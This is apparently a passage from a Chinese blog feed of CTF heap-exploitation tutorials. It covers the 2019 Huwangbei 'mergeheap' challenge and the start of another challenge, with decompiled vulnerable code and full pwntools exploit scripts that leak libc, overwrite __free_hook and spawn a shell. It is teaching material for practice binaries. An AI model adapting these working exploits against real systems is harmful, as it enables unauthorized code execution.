str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#功能性测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    malloc(<span class="number">0x20</span>, <span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">    puts(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">9</span>) <span class="comment">#tcache for avoid top chunk consolidate</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># tcache-0</span></span><br><span class="line">    <span class="comment"># tcache-1</span></span><br><span class="line">    <span class="comment"># tcache-2</span></span><br><span class="line">    <span class="comment"># tcache-3</span></span><br><span class="line">    <span class="comment"># tcache-4</span></span><br><span class="line">    <span class="comment"># tcache-5</span></span><br><span class="line">    <span class="comment"># unsorted - 6</span></span><br><span class="line">    <span class="comment"># unsorted - 7</span></span><br><span class="line">    <span class="comment"># unsorted - 8</span></span><br><span class="line">    <span class="comment"># tcache-9</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-1</span></span><br><span class="line">    <span class="comment"># chunk - 7</span></span><br><span class="line">    <span class="comment"># chunk - 8</span></span><br><span class="line">    <span class="comment"># chunk - 9</span></span><br><span class="line">    <span class="comment"># chunk-0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># now chunk -9's pre_size is 0x200</span></span><br><span class="line">    malloc(<span class="number">0xf8</span>, str(<span class="number">8</span>)*<span class="number">0x7</span>) <span class="comment">#off-by-one change chunk9's insue</span></span><br><span class="line">    free(<span class="number">6</span>) <span class="comment"># free into tcache, so we can use unsortbin consolidate</span></span><br><span class="line">    free(<span class="number">9</span>) <span class="comment"># unsortbin consolidate</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># chunk-6   tcache</span></span><br><span class="line">    <span class="comment"># chunk-5   tcache</span></span><br><span class="line">    <span class="comment"># chunk-4   tcache</span></span><br><span class="line">    <span class="comment"># chunk-3   tcache</span></span><br><span class="line">    <span class="comment"># chunk-2   tcache</span></span><br><span class="line">    <span class="comment"># chunk-1   tcache</span></span><br><span class="line">    <span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line">    <span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line">    <span class="comment"># chunk - 9 unsorted</span></span><br><span class="line">    <span class="comment"># chunk-0   tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">1</span>)*<span class="number">0x7</span>)</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(<span class="number">0x8</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap</span></span><br><span class="line">    <span class="comment"># chunk-1 </span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-8 </span></span><br><span class="line">    <span class="comment"># chunk-0</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># chunk-7</span></span><br><span class="line"></span><br><span class="line">    puts(<span class="number">0</span>)</span><br><span class="line">    libc_leak = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"libc_leak: 0x%x"</span> % libc_leak)</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">    malloc(<span class="number">0x10</span>, str(<span class="number">0x9</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now the heap</span></span><br><span class="line">    <span class="comment"># chunk-1 </span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-8 </span></span><br><span class="line">    <span class="comment"># chunk-0 chunk-9</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># chunk-7</span></span><br><span class="line">    free(<span class="number">1</span>) <span class="comment">#bypass the tcache count check</span></span><br><span class="line">    free(<span class="number">0</span>) </span><br><span class="line">    free(<span class="number">9</span>) <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f2c5</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f322</span><span class="comment"># 0x10a38c</span></span><br><span class="line">    malloc(<span class="number">0x10</span>, p64(free_hook))</span><br><span class="line">    malloc(<span class="number">0x10</span>, <span class="string">'/bin/sh;#'</span>)</span><br><span class="line">    malloc(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line">    io.success(<span class="string">"free_hook: 0x%x"</span> % free_hook)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h2><p>vmmap 这个命令可以指定具体想要查看的内容，比如</p><ol><li>vmmap libc</li><li>vmmap heap</li><li>vmmap stack</li><li>vmmap map</li></ol><p>tcache是FILO,跟栈是类似的</p><p>patchelf 可以指定版本libc, 这样可以调试带符号的libc，加上glibc-all-in-one这个项目或者自己去下载glibc就可以用pwndbg的那些heap bins等命令了<br>具体如下：<br>patchelf –set-interpreter libc目录/ld-2.27.so –set-rpath libc目录 文件名</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>加入tcache后攻击方法变得相对简单，堆块的申请却变得复杂了，因为在leak的时候要考虑tcache，以及构造的时候也要考虑tcache</li><li>我觉得不需要跟我一样标注出每个堆块的位置，我只是学习tcache，所以标注出来方便自己看</li><li>堆块重用这部分经常都是跟off-by-one结合起来</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdGNhY2hlX2F0dGFjay16aC8jY2hhbGxlbmdlLTEtbGN0ZjIwMTgtcHduLWVhc3lfaGVhcA==" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-1-lctf2018-pwn-easy_heap">ctf-wiki<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/f37fbe7f/">https://noone-hub.github.io/posts/f37fbe7f/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程6</title>
    <url>/posts/84788ee9/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程6"><a href="#pwn堆入门系列教程6" class="headerlink" title="pwn堆入门系列教程6"></a>pwn堆入门系列教程6</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjM3Nw==" title="https://xz.aliyun.com/t/6377">pwn堆入门系列教程5<i class="fa fa-external-link"></i></span></p><p>要将别人的东西转化成自己的东西，还是得实操，自己去操作番才可以得到些东西，学了这么久，这几天的比赛也算是用上了，有unlink，有double free，这些操作用上了</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="2019护网杯-mergeheap"><a href="#2019护网杯-mergeheap" class="headerlink" title="2019护网杯 mergeheap"></a>2019护网杯 mergeheap</h2><p>我每次看到题目名字跟函数名字相同，我就知道点就在那个函数上，然而我当时已经看出这里有溢出了，然后调试的时候以为没覆盖到，原来只能覆盖到size，还是脑子不清晰，所以才会这样</p><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>新建一个堆块</li><li>展示堆块内容</li><li>删除一个堆块</li><li>合并两个堆块内容</li><li>退出</li></ol><p>乍一看就只有合并比较可疑了，通常堆题没合并，而题目又是mergeheap</p><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_E29</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">14</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"full"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx1:"</span>);</span><br><span class="line">  v2 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">14</span> || !qword_2020A0[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx2:"</span>);</span><br><span class="line">  v3 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">14</span> || !qword_2020A0[v3] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  v4 = dword_202060[v2] + dword_202060[v3];</span><br><span class="line">  qword_2020A0[i] = <span class="built_in">malloc</span>(v4);</span><br><span class="line">  <span class="built_in">strcpy</span>(qword_2020A0[i], qword_2020A0[v2]);</span><br><span class="line">  <span class="built_in">strcat</span>(qword_2020A0[i], qword_2020A0[v3]);</span><br><span class="line">  dword_202060[i] = v4;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>merge这里的strcpy跟strcat都是遇到\x00结束的，所以，我们如果将下一个堆块的pre_size当数据段来用的话，就可以复制到size部分，merge的时候会覆盖到下一个堆块的size，溢出覆盖size</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_D72</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx:"</span>);</span><br><span class="line">  v2 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(qword_2020A0[v2]);</span><br><span class="line">    qword_2020A0[v2] = <span class="number">0L</span>L;</span><br><span class="line">    v0 = dword_202060;</span><br><span class="line">    dword_202060[v2] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free过后，堆块内容未清空，也就是说，我们申请一个堆块，然后free掉，在申请到这个堆块时候，就可以查看原来堆块的内容</p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li>初始化堆块操作</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) != size:</span><br><span class="line">        io.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1, idx2)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx1))</span><br><span class="line">    io.sendline(str(idx2))</span><br></pre></td></tr></table></figure><ol start="2"><li>填满tcache，并利用unsortbin泄露libc地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x100</span>, str(i)*<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">0x8</span>, <span class="string">'0'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">"0"</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3ebda0</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br></pre></td></tr></table></figure><p>我反过来删除是因为show好弄些，也可以正向删除，show(7)</p><ol start="3"><li>重点，这里的大小要构造好，被复制和被覆盖的得分清楚，最后造成overlap chunk，然后修改tcache的fd指针成malloc_hook就行了，这里跟fastbin不太相似，fastbin这种攻击大小限制得是0x70大小chunk，因为错位的时候只有0x7f通常</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0xe0</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'2'</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>) <span class="comment">#4 被复制的size</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'5'</span>*<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'6'</span>*<span class="number">0x20</span>) <span class="comment">#6 size部分将被覆盖</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">merge(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'7'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">7</span>) </span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#构造overlap chunk</span></span><br></pre></td></tr></table></figure><ol start="4"><li>getshell</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(free_hook)</span><br><span class="line">add(<span class="number">0x80</span>, payload) <span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'mergeheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'mergeheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc-2.27.so'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) != size:</span><br><span class="line">        io.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1, idx2)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx1))</span><br><span class="line">    io.sendline(str(idx2))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        add(<span class="number">0x100</span>, str(i)*<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        delete(<span class="number">7</span>-i)</span><br><span class="line">    add(<span class="number">0x8</span>, <span class="string">'0'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"0"</span>*<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3ebda0</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0xe0</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">'2'</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'5'</span>*<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'6'</span>*<span class="number">0x20</span>) <span class="comment">#6</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    merge(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'7'</span>*<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">6</span>) <span class="comment">#构造overlap chunk</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(free_hook)</span><br><span class="line">    add(<span class="number">0x80</span>, payload) <span class="comment">#6</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x20</span>, p64(system_addr))</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2019-网络内生安全试验场-pwn1"><a href="#2019-网络内生安全试验场-pwn1" class="headerlink" title="2019 网络内生安全试验场 pwn1"></a>2019 网络内生安全试验场 pwn1</h2><h3 id="功能分析-1"><a href="#功能分析-1" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>创建一个堆块</li><li>展示所有堆块</li><li>删除一个堆块</li><li>删除所有堆块</li><li>离开</li></ol><h3 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( lifecount )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Which life do you want to remove: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0x63</span> || !*(&amp;lifelist + v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)*(&amp;lifelist + v1) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)*(&amp;lifelist + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Successful , God !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No life in this lonely planet~ "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在double free，free后为置空</p><h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>我是多次利用double free然后成的,这道题说实话很坑，malloc_hook本地改成one_gadget是可以成功的，远程怎么打都打不上，后面学到一个骚操作，double free触发malloc_hook？？？原理我也不清楚，不过确实远程拿到shell了</p><ol><li>利用double free泄露地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x00000000006020E0</span><span class="number">-0x20</span><span class="number">-0x30</span><span class="number">-0x6</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"a"</span>, <span class="string">"0"</span>) <span class="comment">#0</span></span><br><span 